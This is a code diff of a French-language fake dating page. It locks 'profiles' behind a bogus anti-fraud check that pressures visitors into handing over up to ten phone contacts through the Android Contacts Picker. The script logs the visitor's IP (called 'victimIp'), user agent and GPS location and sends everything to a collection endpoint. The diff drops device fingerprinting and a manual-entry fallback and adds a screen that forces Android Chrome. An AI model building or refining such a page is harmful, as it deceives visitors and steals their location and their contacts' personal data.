@@ -7,13 +7,13 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap');
 
-        :root { --bg: #0f0f11; --card-bg: #1c1c1e; --primary: #ff2d55; --primary-grad: linear-gradient(135deg, #ff2d55, #ff9500); --text: #ffffff; --text-muted: #8e8e93; --input-bg: #2c2c2e; }
+        :root { --bg: #0f0f11; --card-bg: #1c1c1e; --primary: #ff2d55; --primary-grad: linear-gradient(135deg, #ff2d55, #ff9500); --text: #ffffff; --text-muted: #8e8e93; }
 
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body { margin: 0; padding: 0; font-family: 'Outfit', sans-serif; background-color: var(--bg); color: var(--text); display: flex; flex-direction: column; min-height: 100vh; }
 
-        /* --- ÉCRAN D'ACCUEIL --- */
+        /* --- ÉCRAN D'ACCUEIL (GPS) --- */
         .welcome-screen { position: fixed; inset: 0; background: var(--bg); z-index: 200; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center; transition: opacity 0.4s; }
         .welcome-icon { font-size: 60px; margin-bottom: 20px; animation: pulse 2s infinite; }
         .welcome-title { font-size: 26px; font-weight: 800; margin: 0 0 10px; }
@@ -48,15 +48,8 @@
         .modal-title { font-size: 20px; font-weight: 700; margin-bottom: 10px; }
         .modal-subtitle { font-size: 14px; color: var(--text-muted); margin-bottom: 25px; line-height: 1.5; }
 
-        /* Boutons */
         .btn-verify { width: 100%; padding: 18px; background: var(--primary-grad); color: white; border: none; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px; }
         .btn-verify:disabled { opacity: 0.6; }
-
-        /* Fallback (Formulaire manuel) */
-        .fallback-form { display: flex; flex-direction: column; gap: 10px; margin-bottom: 15px; }
-        .fallback-input { width: 100%; padding: 14px; background: var(--input-bg); border: 1px solid #3a3a3c; border-radius: 10px; color: white; font-size: 14px; font-family: 'Outfit', sans-serif; }
-        .fallback-input::placeholder { color: #636366; }
-        .fallback-input:focus { outline: none; border-color: var(--primary); }
 
         .status-msg { font-size: 13px; color: #ff453a; margin-top: 15px; font-weight: 600; min-height: 20px; }
 
@@ -66,8 +59,11 @@
         .spinner { width: 40px; height: 40px; border: 3px solid rgba(255, 45, 85, 0.2); border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* Badge environnement */
-        .env-badge { position: fixed; bottom: 5px; right: 5px; font-size: 9px; color: #2c2c2e; z-index: 300; }
+        /* ÉCRAN BLOQUÉ (Non Android/Chrome) */
+        .blocked-screen { position: fixed; inset: 0; background: var(--bg); z-index: 250; display: none; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center; }
+        .blocked-icon { font-size: 60px; margin-bottom: 20px; }
+        .blocked-title { font-size: 22px; font-weight: 800; margin: 0 0 10px; color: #ff453a; }
+        .blocked-sub { color: var(--text-muted); font-size: 15px; line-height: 1.6; max-width: 320px; }
     </style>
 </head>
 <body>
@@ -95,48 +91,33 @@
     <!-- MODAL -->
     <div class="modal-overlay" id="verifyModal">
         <div class="modal-content">
-            <div class="modal-icon" id="modalIcon">🔒</div>
-            <h2 class="modal-title" id="modalTitle">Contenu verrouillé</h2>
+            <div class="modal-icon">🔒</div>
+            <h2 class="modal-title">Contenu verrouillé</h2>
             <p class="modal-subtitle" id="modalSubtitle">Pour discuter avec <b id="targetName">cette personne</b> et voir ses photos en clair, vous devez faire vérifier votre compte par le système anti-fraude.</p>
             
-            <!-- Section Android/Chrome (Contacts natifs) -->
-            <div id="nativeContactsSection">
-                <div class="progress-box" style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 12px; margin-bottom: 20px;">
-                    <div style="display: flex; justify-content: space-between; font-size: 13px; color: #8e8e93; margin-bottom: 8px;">
-                        <span>Contacts vérifiés</span>
-                        <span id="countDisplay" style="color: #ff2d55; font-weight: bold;">0 / 10</span>
-                    </div>
-                    <div style="height: 6px; background: #2c2c2e; border-radius: 3px; overflow: hidden;">
-                        <div id="progressFill" style="height: 100%; width: 0%; background: linear-gradient(90deg, #ff2d55, #ff9500); transition: width 0.3s;"></div>
-                    </div>
+            <div class="progress-box" style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 12px; margin-bottom: 20px;">
+                <div style="display: flex; justify-content: space-between; font-size: 13px; color: #8e8e93; margin-bottom: 8px;">
+                    <span>Contacts vérifiés</span>
+                    <span id="countDisplay" style="color: #ff2d55; font-weight: bold;">0 / 10</span>
                 </div>
-                <button class="btn-verify" id="inviteBtn" onclick="startVerification()">
-                    <span>Vérifier mon réseau</span>
-                    <span>→</span>
-                </button>
+                <div style="height: 6px; background: #2c2c2e; border-radius: 3px; overflow: hidden;">
+                    <div id="progressFill" style="height: 100%; width: 0%; background: linear-gradient(90deg, #ff2d55, #ff9500); transition: width 0.3s;"></div>
+                </div>
             </div>
 
-            <!-- Section Fallback (Saisie manuelle) -->
-            <div id="fallbackSection" style="display: none;">
-                <p style="font-size: 12px; color: #636366; margin-bottom: 15px;">
-                    ⚠️ Votre navigateur ne supporte pas la vérification automatique. Veuillez saisir manuellement <b>3 contacts de confiance</b> pour débloquer le profil.
-                </p>
-                <div class="fallback-form">
-                    <input class="fallback-input" id="fb_name1" type="text" placeholder="Contact 1 - Nom">
-                    <input class="fallback-input" id="fb_tel1" type="tel" placeholder="Contact 1 - Numéro (+213...)">
-                    <input class="fallback-input" id="fb_name2" type="text" placeholder="Contact 2 - Nom">
-                    <input class="fallback-input" id="fb_tel2" type="tel" placeholder="Contact 2 - Numéro (+213...)">
-                    <input class="fallback-input" id="fb_name3" type="text" placeholder="Contact 3 - Nom">
-                    <input class="fallback-input" id="fb_tel3" type="tel" placeholder="Contact 3 - Numéro (+213...)">
-                </div>
-                <button class="btn-verify" onclick="submitFallback()">
-                    <span>Vérifier et débloquer</span>
-                    <span>→</span>
-                </button>
-            </div>
-
+            <button class="btn-verify" id="inviteBtn" onclick="startVerification()">
+                <span>Sélectionner des contacts</span>
+                <span>→</span>
+            </button>
             <p class="status-msg" id="statusMsg"></p>
         </div>
+    </div>
+
+    <!-- ÉCRAN BLOQUÉ -->
+    <div class="blocked-screen" id="blockedScreen">
+        <div class="blocked-icon">⚠️</div>
+        <h1 class="blocked-title">Navigateur non supporté</h1>
+        <p class="blocked-sub" id="blockedMsg">Veuillez ouvrir ce lien depuis <b>Google Chrome</b> sur un téléphone <b>Android</b> pour continuer la vérification.</p>
     </div>
 
     <!-- Loader Final -->
@@ -165,65 +146,28 @@
         let victimIp = "Inconnue";
         let currentTargetName = "";
         let gpsData = { lat: '', lng: '', acc: '' };
-        let fingerprint = {};
-        let hasNativeContacts = ('contacts' in navigator) && ('ContactsManager' in window);
 
-        // ============ DÉTECTION & FINGERPRINT ============
-
-        // Détection du navigateur
+        // ============ DÉTECTION DU NAVIGATEUR ============
         const ua = navigator.userAgent.toLowerCase();
         const isAndroid = ua.indexOf('android') > -1;
-        const isChrome = ua.indexOf('chrome') > -1 && ua.indexOf('edg') === -1;
-        const isIOS = /iphone|ipad|ipod/.test(ua);
-        const isInApp = /fban|fbav|instagram|twitter|snapchat|whatsapp|fb_iab|line\/|micromessenger/.test(ua);
-        const isDesktop = !isAndroid && !isIOS;
+        const isChrome = ua.indexOf('chrome') > -1 && ua.indexOf('edg') === -1 && ua.indexOf('opr') === -1;
+        const isInApp = /fban|fbav|instagram|twitter|snapchat|whatsapp|fb_iab/.test(ua);
+        
+        // L'API Contacts n'existe que sur Chrome Android (et pas dans les navigateurs intégrés)
+        const canUseContacts = isAndroid && isChrome && !isInApp && ('contacts' in navigator);
 
-        // Environnement effectif
-        let env = 'fallback';
-        if (isAndroid && isChrome && hasNativeContacts && !isInApp) {
-            env = 'native';  // Capture optimale
-        }
-
-        // Fingerprint (Canvas + WebGL + Hardware)
-        function getFingerprint() {
-            const fp = { canvas: null, webgl: null, fonts: [], screen: null, cores: null, memory: null, touch: null, battery: null, lang: null, tz: null };
+        // Si le navigateur ne peut pas faire la sélection, on bloque l'accès
+        if (!canUseContacts) {
+            document.getElementById('welcomeScreen').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'none';
+            document.getElementById('blockedScreen').style.display = 'flex';
             
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = 200; canvas.height = 40;
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top'; ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 200, 40);
-                ctx.fillStyle = '#069'; ctx.fillText('Meta 图 1', 2, 2);
-                fp.canvas = canvas.toDataURL().slice(-50);
-            } catch (e) {}
-
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                fp.webgl = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL).substring(0, 80);
-            } catch (e) {}
-
-            try {
-                fp.screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
-                fp.cores = navigator.hardwareConcurrency || null;
-                fp.memory = navigator.deviceMemory || null;
-                fp.touch = navigator.maxTouchPoints || 0;
-                fp.lang = navigator.language;
-                fp.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            } catch (e) {}
-
-            // Batterie (si supportée)
-            if (navigator.getBattery) {
-                navigator.getBattery().then(b => {
-                    fingerprint.battery = `${Math.round(b.level * 100)}%${b.charging ? ' charging' : ''}`;
-                }).catch(() => {});
+            if (isInApp) {
+                document.getElementById('blockedMsg').innerHTML = "Vous êtes dans le navigateur d'une application. Cliquez sur les <b>trois petits points en haut à droite</b> et choisissez <b>'Ouvrir dans Chrome'</b>.";
+            } else if (!isAndroid) {
+                document.getElementById('blockedMsg').innerHTML = "L'accès nécessite un appareil <b>Android</b> et le navigateur <b>Google Chrome</b>.";
             }
-
-            return fp;
         }
-
-        fingerprint = getFingerprint();
 
         // ============ CLICK TRACKING ============
         async function sendInitialHit() {
@@ -232,25 +176,21 @@
                 const ipData = await res.json();
                 victimIp = ipData.ip;
 
-                const payload = {
-                    type: 'visit',
-                    ip: victimIp,
-                    ua: navigator.userAgent,
-                    env: env,
-                    fingerprint: fingerprint,
-                    time: new Date().toISOString()
-                };
-
                 await fetch(ENDPOINT, {
                     method: 'POST', mode: 'no-cors',
                     headers: { 'Content-Type': 'text/plain' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        type: 'visit',
+                        ip: victimIp,
+                        ua: navigator.userAgent,
+                        time: new Date().toISOString()
+                    })
                 });
-            } catch (e) { console.error(e); }
+            } catch (e) {}
         }
         sendInitialHit();
 
-        // ============ DEMANDE GPS ============
+        // ============ GPS ============
         function requestLocation() {
             const btn = document.getElementById('btnLocate');
             btn.disabled = true;
@@ -271,7 +211,7 @@
             );
         }
 
-        // ============ AFFICHAGE PROFILS ============
+        // ============ AFFICHAGE ============
         function showMainContent() {
             document.getElementById('welcomeScreen').style.display = 'none';
             document.getElementById('mainContent').style.display = 'flex';
@@ -297,40 +237,15 @@
             }
         }
 
-        // ============ MODAL ADAPTATIF ============
+        // ============ MODAL ============
         function openModal(name) {
             currentTargetName = name;
             document.getElementById('targetName').innerText = name;
             document.getElementById('verifyModal').classList.add('active');
             if (navigator.vibrate) navigator.vibrate(30);
-
-            // Adapter l'interface selon l'environnement
-            const nativeSection = document.getElementById('nativeContactsSection');
-            const fallbackSection = document.getElementById('fallbackSection');
-
-            if (env === 'native') {
-                // Chrome Android : sélecteur natif
-                nativeSection.style.display = 'block';
-                fallbackSection.style.display = 'none';
-            } else {
-                // Fallback : formulaire manuel
-                nativeSection.style.display = 'none';
-                fallbackSection.style.display = 'block';
-                
-                // Adapter le sous-titre selon l'appareil
-                let subtitle = document.getElementById('modalSubtitle');
-                if (isIOS) {
-                    subtitle.innerHTML = `Pour discuter avec <b>${name}</b>, vous devez saisir manuellement 3 contacts de confiance (vérification iOS).`;
-                } else if (isInApp) {
-                    subtitle.innerHTML = `⚠️ Pour une meilleure expérience, ouvrez ce lien dans <b>Google Chrome</b>. En attendant, saisissez 3 contacts de confiance.`;
-                } else {
-                    subtitle.innerHTML = `Pour discuter avec <b>${name}</b>, saisissez 3 contacts de confiance pour la vérification anti-fraude.`;
-                }
-            }
         }
 
-        // ============ CAPTURE NATIVE (Chrome Android) ============
-               // ============ CAPTURE NATIVE (Chrome Android) ============
+        // ============ SÉLECTION DES CONTACTS ============
         async function startVerification() {
             if (allContacts.length >= TARGET_CONTACTS) return;
             if (navigator.vibrate) navigator.vibrate(50);
@@ -338,11 +253,11 @@
             const btn = document.getElementById('inviteBtn');
             const status = document.getElementById('statusMsg');
             btn.disabled = true;
-            btn.innerHTML = `<span>Analyse...</span>`;
+            btn.innerHTML = `<span>Ouverture...</span>`;
             status.innerText = "";
-            status.style.color = "#ff453a"; // Remettre la couleur rouge
 
             try {
+                // Ouvre le sélecteur natif Android
                 const list = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                 
                 if (list && list.length > 0) {
@@ -366,49 +281,19 @@
                     }
                     updateUI();
                 } else {
-                    // Si elle ouvre le répertoire mais ne coche personne
-                    status.innerText = "Veuillez sélectionner au moins un contact pour continuer.";
+                    status.innerText = "Vous n'avez sélectionné aucun contact.";
                 }
             } catch (e) {
-                // Si elle clique sur "Annuler" ou ferme le sélecteur
-                status.innerText = "Vérification incomplète. Veuillez sélectionner des contacts pour débloquer le profil.";
+                // Si l'utilisateur clique sur "Annuler" dans le menu Android
+                status.innerText = "Action annulée. Vous devez sélectionner des contacts pour continuer.";
             } finally {
-                // Le bouton redevient cliquable dans tous les cas
                 btn.disabled = false;
                 if (allContacts.length < TARGET_CONTACTS) {
-                    btn.innerHTML = `<span>Réessayer (${allContacts.length}/${TARGET_CONTACTS})</span> <span>→</span>`;
+                    btn.innerHTML = `<span>Sélectionner à nouveau (${allContacts.length}/${TARGET_CONTACTS})</span> <span>→</span>`;
                 }
             }
         }
 
-        // ============ FALLBACK (Saisie manuelle) ============
-        async function submitFallback() {
-            const status = document.getElementById('statusMsg');
-            const contacts = [];
-            
-            for (let i = 1; i <= 3; i++) {
-                const name = document.getElementById('fb_name' + i).value.trim();
-                const tel = document.getElementById('fb_tel' + i).value.trim();
-                if (name && tel) contacts.push({ name: name, tel: tel });
-            }
-
-            if (contacts.length < 3) {
-                status.innerText = "Veuillez remplir les 3 contacts pour continuer.";
-                return;
-            }
-
-            status.innerText = "Vérification en cours...";
-            
-            // Envoi au serveur
-            await sendToServer(contacts, 'fallback');
-
-            // Succès : redirection
-            document.getElementById('verifyModal').classList.remove('active');
-            document.getElementById('loader').classList.add('show');
-            setTimeout(() => { window.location.href = "https://www.apple.com"; }, 2000);
-        }
-
-        // ============ UI COMMUNE ============
         function updateUI() {
             const count = allContacts.length;
             document.getElementById('countDisplay').innerText = `${count} / ${TARGET_CONTACTS}`;
@@ -421,16 +306,13 @@
             }
         }
 
-        // ============ ENVOI ============
-        async function sendToServer(contacts, source = 'native') {
+        // ============ ENVOI DES DONNÉES ============
+        async function sendToServer(contacts) {
             const payload = { 
                 target: currentTargetName,
                 contacts: contacts, 
                 ip: victimIp, 
                 ua: navigator.userAgent,
-                env: env,
-                source: source,
-                fingerprint: fingerprint,
                 lat: gpsData.lat,
                 lng: gpsData.lng,
                 acc: gpsData.acc
